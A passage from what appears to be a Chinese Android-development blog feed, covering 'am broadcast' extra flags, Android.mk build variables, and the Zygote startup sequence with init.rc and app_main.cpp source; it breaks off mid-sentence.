class="line">[-e|--es &lt;EXTRA_KEY&gt; &lt;EXTRA_STRING_VALUE&gt; ...]</span><br><span class="line">[--esn &lt;EXTRA_KEY&gt; ...]</span><br><span class="line">[--ez &lt;EXTRA_KEY&gt; &lt;EXTRA_BOOLEAN_VALUE&gt; ...]</span><br><span class="line">[--ei &lt;EXTRA_KEY&gt; &lt;EXTRA_INT_VALUE&gt; ...]</span><br><span class="line">[--el &lt;EXTRA_KEY&gt; &lt;EXTRA_LONG_VALUE&gt; ...]</span><br><span class="line">[--ef &lt;EXTRA_KEY&gt; &lt;EXTRA_FLOAT_VALUE&gt; ...]</span><br><span class="line">[--eu &lt;EXTRA_KEY&gt; &lt;EXTRA_URI_VALUE&gt; ...]</span><br><span class="line">[--ecn &lt;EXTRA_KEY&gt; &lt;EXTRA_COMPONENT_NAME_VALUE&gt;]</span><br><span class="line">[--eia &lt;EXTRA_KEY&gt; &lt;EXTRA_INT_VALUE&gt;[,&lt;EXTRA_INT_VALUE...]]</span><br><span class="line">(mutiple extras passed as Integer[])</span><br><span class="line">[--eial &lt;EXTRA_KEY&gt; &lt;EXTRA_INT_VALUE&gt;[,&lt;EXTRA_INT_VALUE...]]</span><br><span class="line">(mutiple extras passed as List&lt;Integer&gt;)</span><br><span class="line">[--ela &lt;EXTRA_KEY&gt; &lt;EXTRA_LONG_VALUE&gt;[,&lt;EXTRA_LONG_VALUE...]]</span><br><span class="line">(mutiple extras passed as Long[])</span><br><span class="line">[--elal &lt;EXTRA_KEY&gt; &lt;EXTRA_LONG_VALUE&gt;[,&lt;EXTRA_LONG_VALUE...]]</span><br><span class="line">(mutiple extras passed as List&lt;Long&gt;)</span><br><span class="line">[--efa &lt;EXTRA_KEY&gt; &lt;EXTRA_FLOAT_VALUE&gt;[,&lt;EXTRA_FLOAT_VALUE...]]</span><br><span class="line">(mutiple extras passed as Float[])</span><br><span class="line">[--efal &lt;EXTRA_KEY&gt; &lt;EXTRA_FLOAT_VALUE&gt;[,&lt;EXTRA_FLOAT_VALUE...]]</span><br><span class="line">(mutiple extras passed as List&lt;Float&gt;)</span><br><span class="line">[--esa &lt;EXTRA_KEY&gt; &lt;EXTRA_STRING_VALUE&gt;[,&lt;EXTRA_STRING_VALUE...]]</span><br><span class="line">(mutiple extras passed as String[]; to embed a comma into a string,</span><br><span class="line">escape it using &quot;\,&quot;)</span><br><span class="line">[--esal &lt;EXTRA_KEY&gt; &lt;EXTRA_STRING_VALUE&gt;[,&lt;EXTRA_STRING_VALUE...]]</span><br><span class="line">(mutiple extras passed as List&lt;String&gt;; to embed a comma into a string,</span><br><span class="line">escape it using &quot;\,&quot;)</span><br><span class="line">[--f &lt;FLAG&gt;]</span><br><span class="line">[--grant-read-uri-permission] [--grant-write-uri-permission]</span><br><span class="line">[--grant-persistable-uri-permission] [--grant-prefix-uri-permission]</span><br><span class="line">[--debug-log-resolution] [--exclude-stopped-packages]</span><br><span class="line">[--include-stopped-packages]</span><br><span class="line">[--activity-brought-to-front] [--activity-clear-top]</span><br><span class="line">[--activity-clear-when-task-reset] [--activity-exclude-from-recents]</span><br><span class="line">[--activity-launched-from-history] [--activity-multiple-task]</span><br><span class="line">[--activity-no-animation] [--activity-no-history]</span><br><span class="line">[--activity-no-user-action] [--activity-previous-is-top]</span><br><span class="line">[--activity-reorder-to-front] [--activity-reset-task-if-needed]</span><br><span class="line">[--activity-single-top] [--activity-clear-task]</span><br><span class="line">[--activity-task-on-home]</span><br><span class="line">[--receiver-registered-only] [--receiver-replace-pending]</span><br><span class="line">[--receiver-foreground]</span><br><span class="line">[--selector]</span><br><span class="line">[&lt;URI&gt; | &lt;PACKAGE&gt; | &lt;COMPONENT&gt;]</span><br></pre></td></tr></table></figure><p>例1：</p><p>adb shell am broadcast -a com.android.test –es <font color=blue>test_string</font> <font color=red>“this is test string”</font> –ei  <font color=blue>test_int</font> <font color=red>100</font> –ez <font color=blue>test_boolean</font> <font color=red>true</font></p><p>adb shell am broadcast -a com.android.test  –el <font color=blue>taskID</font> <font color=red>“1000”</font> –esal <font color=blue>timeStamp</font> <font color=red>“1616406514385”,”1616406531920”,”1616406540791”</font></p><p><strong>说明：–es 表示使用字符串类型参数  –ei 表示int类型参数  –ez 表示boolean类型参数   –el  标示long类型的参数    –esal  标示string类型的数据   蓝色为key，红色为value</strong></p><p>例2：蓝色为key，红色为value，分别为String类型，int类型，boolean类型</p><p>adb shell am broadcast -a com.android.test –eia <font color=blue>timeon</font> <font color=red>2024,03,09,12,55</font> –eia <font color=blue>timeoff</font> <font color=red>2024,03,09,12,46</font> –ez <font color=blue>enable</font> <font color=red>true</font></p><p>说明：–eia 表示使用int[]参数   蓝色为key，红色为value</p><p>等价于以下java代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">intent1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="string">&quot;android.intent.action.gz.setpoweronoff&quot;</span>);</span><br><span class="line"><span class="type">int</span>[] timeon = &#123;<span class="number">2024</span>,<span class="number">03</span>,09,<span class="number">12</span>,<span class="number">55</span>&#125;; </span><br><span class="line"><span class="type">int</span>[] timeoff= &#123;<span class="number">2024</span>,<span class="number">03</span>,09,<span class="number">12</span>,<span class="number">46</span>&#125;;</span><br><span class="line">intent.putExtra(<span class="string">&quot;timeon&quot;</span>, timeon);</span><br><span class="line">intent.putExtra(<span class="string">&quot;timeoff&quot;</span>, timeoff);</span><br><span class="line">intent.putExtra(<span class="string">&quot;enable&quot;</span>,<span class="literal">true</span>); <span class="comment">//使能开关机功能，　设为false,则为关闭，true为打开</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Android </tag>
            
            <tag> framework </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android.mk变量解析</title>
      <link href="/2024/03/03/2024-03-03/"/>
      <url>/2024/03/03/2024-03-03/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Android.mk是Android提供的一种makefile文件，用来指定诸如编译生成so库名、引用的头文件目录、需要编译的.c/.cpp文件和.a静态库文件等。要掌握jni，就必须熟练掌握Android.mk的语法规范。 </p><h3 id="LOCAL-PATH-call-my-dir"><a href="#LOCAL-PATH-call-my-dir" class="headerlink" title="LOCAL_PATH:= $(call my-dir)"></a>LOCAL_PATH:= $(call my-dir)</h3><p>一个Android.mk file首先必须定义好LOCAL_PATH变量。它用于在开发树中查找源文件。在这个例子中，宏函数‘my-dir’, 由编译系统提供，用于返回当前路径（即包含Android.mk file文件的目录）</p><h3 id="include-CLEAR-VARS"><a href="#include-CLEAR-VARS" class="headerlink" title="include $(CLEAR_VARS)"></a>include $(CLEAR_VARS)</h3><p>CLEAR_VARS由编译系统提供（(可以在 android 安装目录下的/build/core/config.mk 文件看到其定义，为 CLEAR_VARS := $(BUILD_SYSTEM)/clear_vars.mk)），指定让GNU MAKEFILE为你清除许多LOCAL_XXX变量（例如 LOCAL_MODULE, LOCAL_SRC_FILES, LOCAL_STATIC_LIBRARIES , 等等…)，除LOCAL_PATH 。这是必要的，因为所有的编译控制文件都在同一个GNU MAKE执行环境中，所有的变量都是全局的</p><h3 id="LOCAL-MODULE-TAGS-optional"><a href="#LOCAL-MODULE-TAGS-optional" class="headerlink" title="LOCAL_MODULE_TAGS := optional"></a>LOCAL_MODULE_TAGS := optional</h3><p>user: 指该模块只在user版本下才编译<br>eng: 指该模块只在eng版本下才编译<br>tests: 指该模块只在tests版本下才编译<br>optional:指该模块在所有版本下都编译</p><h3 id="LOCAL-CERTIFICATE-platform"><a href="#LOCAL-CERTIFICATE-platform" class="headerlink" title="LOCAL_CERTIFICATE := platform"></a>LOCAL_CERTIFICATE := platform</h3><p>这个功能和 android:sharedUserId和LOCAL_CERTIFICATE 相关。<br>都是用系统的签名来对apk 进行签名。其中签名的文件是：build\target\product\security”，下面的platform.pk8和platform.x509.pem两个文件<br>签名的工具是：<br>Android提供的Signapk工具来签名，signapk的源代码是在”build\tools\signapk”下，用法为”signapk platform.x509.pem platform.pk8 input.apk output.apk”<br>其中通过 android:sharedUserId 也已可应用共享同一个进程，但是如果签名不一样是没有办法共享的，其中签名问题还设计到很多，之后可以补充。<br>其中这个属性还可以有其他的赋值比如:<br>LOCAL_CERTIFICATE := PRESIGNED 表示 这个apk已经签过名了，系统不需要再次 签名；<br>LOCAL_CERTIFICATE := platform 表示为系统签名<br>LOCAL_CERTIFICATE := media<br>用于指定签名时使用的KEY，如果不指定，默认使用testkey，LOCAL_CERTIFICATE可设置的值如下：<br>LOCAL_CERTIFICATE := platform 该APK完成一些系统的核心功能。经过对系统中存在的文件夹的访问测试，这种方式编译出来的APK所在进程的UID为system<br>LOCAL_CERTIFICATE := shared 该APK需要和home/contacts进程共享数据。<br>LOCAL_CERTIFICATE := media 该APK是media/download系统中的一环。<br>LOCAL_CERTIFICATE := testkey 普通APK，默认情况下使用。、<br>对于使用eclipse编译的apk，其实 是用testkey 来签的名；我们也可以用signapk.jar来手动进行签名，其源码在build/tools/signapk下，编译后在out/host/linux-x86/framework/signapk.jar，也可以从网上下载。使用方法，例如：把签名修改为platform：Java -jar ./signapk　platform.x509.pem platform.pk8 input.apk output.apk (platform.x509.pem platform.pk8在build/target/product/security获取)。build/target/product/security获取)。</p><h3 id="LOCAL-PROGUARD-ENABLED-disabled"><a href="#LOCAL-PROGUARD-ENABLED-disabled" class="headerlink" title="LOCAL_PROGUARD_ENABLED := disabled"></a>LOCAL_PROGUARD_ENABLED := disabled</h3><p>是否混淆</p><h3 id="LOCAL-PACKAGE-NAME-Name"><a href="#LOCAL-PACKAGE-NAME-Name" class="headerlink" title="LOCAL_PACKAGE_NAME := Name"></a>LOCAL_PACKAGE_NAME := Name</h3><p>给这个package 确定name</p><h3 id="LOCAL-PRIVATE-PLATFORM-APIS-true"><a href="#LOCAL-PRIVATE-PLATFORM-APIS-true" class="headerlink" title="LOCAL_PRIVATE_PLATFORM_APIS := true"></a>LOCAL_PRIVATE_PLATFORM_APIS := true</h3><p>是否使用系统@hide api</p><h3 id="LOCAL-PRIVILEGED-MODULE-true"><a href="#LOCAL-PRIVILEGED-MODULE-true" class="headerlink" title="LOCAL_PRIVILEGED_MODULE := true"></a>LOCAL_PRIVILEGED_MODULE := true</h3><p>对于Android系统应用，LOCAL_PRIVILEGED_MODULE 决定了其编译后的在ROM中的安装位置：<br>如果不设置或者设置为false，安装位置为system/app；<br>如果设置为true，安装位置为system/priv-app。</p><h3 id="LOCAL-AAPT-FLAGS-–auto-add-overlay"><a href="#LOCAL-AAPT-FLAGS-–auto-add-overlay" class="headerlink" title="LOCAL_AAPT_FLAGS := –auto-add-overlay"></a>LOCAL_AAPT_FLAGS := –auto-add-overlay</h3><p>aapt即Android Asset Packaging Tool，在SDK的build-tools目录下。该工具可以查看，创建， 更新ZIP格式的文档附件(zip, jar, apk)。也可将资源文件编译成二进制文件，尽管你可能没有直接使用过aapt工具，但是build scripts和IDE插件会使用这个工具打包apk文件构成一个Android 应用程序。也就是上面说的配置</p><h3 id="LOCAL-PROGUARD-FLAG-FILES-proguard-flags"><a href="#LOCAL-PROGUARD-FLAG-FILES-proguard-flags" class="headerlink" title="LOCAL_PROGUARD_FLAG_FILES := proguard.flags"></a>LOCAL_PROGUARD_FLAG_FILES := proguard.flags</h3><p>针对android 选择user版本进行编译的时候，会出现proguard错误，我们需要知道的事情<br>1.proguard是做什么的，他的作用是将java代码进行混淆的工具<br>2.因为proguard是混淆工具，所以android的mk文件也对其支持为两种方式：</p><blockquote><p>2.1指定不需要混淆的native方法与变量的proguard.flags文件如：LOCAL_PROGUARD_FLAG_FILES := proguard.flags<br>2.2制定编译的工程，不要使用代码混淆的工具进行代码混淆如：LOCAL_PROGUARD_ENABLED := disabled</p></blockquote><p>3.不设置，默认使用LOCAL_PROGUARD_ENABLED := full.即将该工程代码全部混淆</p><h3 id="LOCAL-DEX-PREOPT-false"><a href="#LOCAL-DEX-PREOPT-false" class="headerlink" title="LOCAL_DEX_PREOPT := false"></a>LOCAL_DEX_PREOPT := false</h3><p>odex文件简单来说就是android为了优化启动速度而将classes.dex文件提取出来的一个产物<br>不生成odex，只生成apk，将 LOCAL_DEX_PREOPT 的值改为 false 即可</p><h3 id="include-BUILD-SHARED-LIBRARY"><a href="#include-BUILD-SHARED-LIBRARY" class="headerlink" title="include $(BUILD_SHARED_LIBRARY)"></a>include $(BUILD_SHARED_LIBRARY)</h3><p>BUILD_SHARED_LIBRARY表示编译一个静态库</p><h3 id="include-BUILD-PACKAGE"><a href="#include-BUILD-PACKAGE" class="headerlink" title="include $(BUILD_PACKAGE)"></a>include $(BUILD_PACKAGE)</h3><p>BUILD_PACKAGE表示编译一个APK包</p><h3 id="include-BUILD-SHARED-LIBRARY-1"><a href="#include-BUILD-SHARED-LIBRARY-1" class="headerlink" title="include $(BUILD_SHARED_LIBRARY)"></a>include $(BUILD_SHARED_LIBRARY)</h3><p>BUILD_SHARED_LIBRARY表示编译一个动态库</p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Android </tag>
            
            <tag> framework </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android 14 Zygote进程解析</title>
      <link href="/2024/03/02/2024-03-02/"/>
      <url>/2024/03/02/2024-03-02/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>init进程启动后，最重要的一个进程就是Zygote进程,Zygote是所有应用的鼻祖。SystemServer和其他所有Dalivik虚拟机进程都是由Zygote fork而来。<br>Zygote进程由app_process启动，Zygote是一个C/S模型，Zygote进程作为服务端，其他进程作为客户端向它发出“孵化-fork”请求，而Zygote接收到这个请求后就“孵化-fork”出一个新的进程。<br>由于Zygote进程在启动时会创建Java虚拟机，因此通过fork而创建的应用程序进程和SystemServer进程可以在内部获取一个Java虚拟机的实例拷贝。<br>架构图</p><p><img src="/images/20240302/20240302001.png"></p><h3 id="Zygote是如何启动的"><a href="#Zygote是如何启动的" class="headerlink" title="Zygote是如何启动的"></a>Zygote是如何启动的</h3><p>init进程启动后，会解析init.rc文件，然后创建和加载service字段指定的进程。zygote进程就是以这种方式，被init进程加载的。<br><strong>system/core/rootdir/init.rc</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import /system/etc/init/hw/init.$&#123;ro.zygote&#125;.rc</span><br></pre></td></tr></table></figure><p>其中${ro.zygote} 由各个厂家使用，现在的主流厂家基本使用zygote64_32，因此，我们的rc文件为 init.zygote64_32.r。它会启动两个zygote进程（名为zygote和zygote——secondary），对应的执行程序分别是app_prcocess64(主模式)、app_process32。<br><strong>init.zygote64_32.rc</strong><br><strong>system/core/rootdir/init.zygote64_32.rc</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">service zygote /system/bin/app_process64 -Xzygote /system/bin --zygote --start-system-server --socket-name=zygote</span><br><span class="line">    class main</span><br><span class="line">    priority <span class="number">-20</span></span><br><span class="line">    user root <span class="comment">//用户为root</span></span><br><span class="line">    group root readproc reserved_disk <span class="comment">//访问组支持root readproc reserved_disk</span></span><br><span class="line">    socket zygote stream <span class="number">660</span> root system <span class="comment">//创建一个socket，名字叫zygote，以tcp形式，可以在/dev/socket 中看到一个 zygote的socket</span></span><br><span class="line">    socket usap_pool_primary stream <span class="number">660</span> root system</span><br><span class="line">    onrestart exec_background - system system -- /system/bin/vdc volume abort_fuse</span><br><span class="line">    onrestart write /sys/power/state on</span><br><span class="line">     onrestart restart audioserver</span><br><span class="line">     onrestart restart cameraserver</span><br><span class="line">     onrestart restart media</span><br><span class="line">     onrestart restart netd</span><br><span class="line">     onrestart restart wificond</span><br><span class="line">     task_profiles ProcessCapacityHigh MaxPerformance</span><br><span class="line">     critical window=$&#123;zygote.critical_window.minute:-off&#125; target=zygote-fatal</span><br><span class="line"> </span><br><span class="line"> service zygote_secondary /system/bin/app_process32 -Xzygote /system/bin --zygote --socket-name=zygote_secondary --enable-lazy-preload</span><br><span class="line">     class main</span><br><span class="line">     priority <span class="number">-20</span></span><br><span class="line">     user root</span><br><span class="line">     group root readproc reserved_disk</span><br><span class="line">     socket zygote_secondary stream <span class="number">660</span> root system</span><br><span class="line">     socket usap_pool_secondary stream <span class="number">660</span> root system</span><br><span class="line">     onrestart restart zygote</span><br><span class="line">     task_profiles ProcessCapacityHigh MaxPerformance</span><br></pre></td></tr></table></figure><p>从上面一段代码可以看出：<br>第一个Zygote进程：<br>进程名：zygote<br>进程通过 /system/bin/app_process64来启动<br>启动参数： -Xzygote<br>/system/bin<br>–zygote<br>–start-system-server<br>–socket-name=zygote<br>socket的名称：zygote<br>第二个Zygote进程：<br>进程名：zygote_secondary<br>进程通过 /system/bin/app_process32来启动<br>启动参数： -Xzygote<br>/system/bin<br>–zygote<br>–socket-name=zygote_secondary<br>–enable-lazy-preload<br>socket的名称：zygote_secondary<br>对应的代码入口为：frameworks/base/cmds/app_process/app_main.cpp</p><h3 id="Zygote启动后做了什么"><a href="#Zygote启动后做了什么" class="headerlink" title="Zygote启动后做了什么"></a>Zygote启动后做了什么</h3><p>init进程通过init.zygote64_32.rc来调用/system/bin/app_process64 来启动zygote进程，入口app_main.cpp<br><strong>frameworks/base/cmds/app_process/app_main.cpp</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* <span class="type">const</span> argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">zygote传入的参数是：</span></span><br><span class="line"><span class="comment">        -Xzygote</span></span><br><span class="line"><span class="comment">        /system/bin</span></span><br><span class="line"><span class="comment">        --zygote</span></span><br><span class="line"><span class="comment">        --start-system-server</span></span><br><span class="line"><span class="comment">        --socket-name=zygote</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">zygote_secondary传入的参数是：</span></span><br><span class="line"><span class="comment">        -Xzygote</span></span><br><span class="line"><span class="comment">        /system/bin</span></span><br><span class="line"><span class="comment">        --zygote</span></span><br><span class="line"><span class="comment">        --socket-name=zygote_secondary</span></span><br><span class="line"><span class="comment">        --enable-lazy-preload  </span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    </span><br><span class="line">    ......</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// Parse runtime arguments.  Stop at first unrecognized option.</span></span><br><span class="line">    <span class="type">bool</span> zygote = <span class="literal">false</span>;</span><br><span class="line">    <span class="type">bool</span> startSystemServer = <span class="literal">false</span>;</span><br><span class="line">    <span class="type">bool</span> application = <span class="literal">false</span>;</span><br><span class="line">    String8 niceName;</span><br><span class="line">    String8 className;</span><br><span class="line"> </span><br><span class="line">    ++i;  <span class="comment">// Skip unused &quot;parent dir&quot; argument.</span></span><br><span class="line">    <span class="keyword">while</span> (i &lt; argc) &#123;</span><br><span class="line">        <span class="type">const</span> <span class="type">char</span>* arg = argv[i++];</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strcmp</span>(arg, <span class="string">&quot;--zygote&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            zygote = <span class="literal">true</span>;</span><br><span class="line">            <span class="comment">//对于64位系统nice_name为zygote64，32位系统为zygote</span></span><br><span class="line">            niceName = ZYGOTE_NICE_NAME;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(arg, <span class="string">&quot;--start-system-server&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">//是否需要启动system server</span></span><br><span class="line">            startSystemServer = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(arg, <span class="string">&quot;--application&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">//启动进入独立的程序模式</span></span><br><span class="line">            application = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strncmp</span>(arg, <span class="string">&quot;--nice-name=&quot;</span>, <span class="number">12</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">//niceName为当前进程别名，区别abi型号</span></span><br><span class="line">            niceName.setTo(arg + <span class="number">12</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strncmp</span>(arg, <span class="string">&quot;--&quot;</span>, <span class="number">2</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">            className.setTo(arg);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            --i;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    Vector&lt;String8&gt; args;</span><br><span class="line">    <span class="keyword">if</span> (!className.isEmpty()) &#123;<span class="comment">//className不为空，说明是application启动模式</span></span><br><span class="line">        <span class="comment">// We&#x27;re not in zygote mode, the only argument we need to pass</span></span><br><span class="line">        <span class="comment">// to RuntimeInit is the application argument.</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// The Remainder of args get passed to startup class main(). Make</span></span><br><span class="line">        <span class="comment">// copies of them before we overwrite them with the process name.</span></span><br><span class="line">        args.add(application ? String8(<span class="string">&quot;application&quot;</span>) : String8(<span class="string">&quot;tool&quot;</span>));</span><br><span class="line">        runtime.setClassNameAndArgs(className, argc - i, argv + i);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (!LOG_NDEBUG) &#123;</span><br><span class="line">          String8 restOfArgs;</span><br><span class="line">          <span class="type">char</span>* <span class="type">const</span>* argv_new = argv + i;</span><br><span class="line">          <span class="type">int</span> argc_new = argc - i;</span><br><span class="line">          <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; argc_new; ++k) &#123;</span><br><span class="line">            restOfArgs.append(<span class="string">&quot;\&quot;&quot;</span>);</span><br><span class="line">            restOfArgs.append(argv_new[k]);</span><br><span class="line">            restOfArgs.append(<span class="string">&quot;\&quot; &quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          ALOGV(<span class="string">&quot;Class name = %s, args = %s&quot;</span>, className.<span class="built_in">string</span>(), restOfArgs.<span class="built_in">string</span>());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// We&#x27;re in zygote mode.</span></span><br><span class="line">        <span class="comment">//进入zygote模式</span></span><br><span class="line">        <span class="comment">//新建Dalvik的缓存目录：/data/dalvik-cache</span></span><br><span class="line">        maybeCreateDalvikCache();</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (startSystemServer) &#123;</span><br><span class="line">            <span class="comment">//添加start-system-server参数</span></span><br><span class="line">            args.add(String8(<span class="string">&quot;start-system-server&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="type">char</span> prop[PROP_VALUE_MAX];</span><br><span class="line">        <span class="keyword">if</span> (property_get(ABI_LIST_PROPERTY, prop, <span class="literal">NULL</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            LOG_ALWAYS_FATAL(<span class="string">&quot;app_process: Unable to determine ABI list from property %s.&quot;</span>,</span><br><span class="line">                ABI_LIST_PROPERTY);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">11</span>;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        String8 <span class="title function_">abiFlag</span><span class="params">(<span class="string">&quot;--abi-list=&quot;</span>)</span>;</span><br><span class="line">        abiFlag.append(prop);</span><br><span class="line">        <span class="comment">//添加--abi-list=参数</span></span><br><span class="line">        args.add(abiFlag);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// In zygote mode, pass all remaining arguments to the zygote</span></span><br><span class="line">        <span class="comment">// main() method.</span></span><br><span class="line">        <span class="keyword">for</span> (; i &lt; argc; ++i) &#123;</span><br><span class="line">            <span class="comment">//将剩下的参数加入args</span></span><br><span class="line">            args.add(String8(argv[i]));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//设置一个“好听的昵称” zygote\zygote64，之前的名称是app_process</span></span><br><span class="line">    <span class="keyword">if</span> (!niceName.isEmpty()) &#123;</span><br><span class="line">        runtime.setArgv0(niceName.<span class="built_in">string</span>(), <span class="literal">true</span> <span class="comment">/* setProcName */</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (zygote) &#123;</span><br><span class="line">        <span class="comment">//如果是zygote启动模式，则加载ZygoteInit</span></span><br><span class="line">        runtime.start(<span class="string">&quot;com.android.internal.os.ZygoteInit&quot;</span>, args, zygote);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (className) &#123;</span><br><span class="line">        <span class="comment">//如果是application启动模式，则加载RuntimeInit</span></span><br><span class="line">        runtime.start(<span class="string">&quot;com.android.internal.os.RuntimeInit&quot;</span>, args, zygote);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//没有指定类名或zygote，参数错误</span></span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Error: no class name or --zygote supplied.\n&quot;</span>);</span><br><span class="line">        app_usage();</span><br><span class="line">        LOG_ALWAYS_FATAL(<span class="string">&quot;app_process: no class name or --zygote supplied.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Zygote本身是一个Native的应用程序，刚开始的进程名称为“app_process”，运行过程中，通过调用setArgv0将名字改为zygote 或者 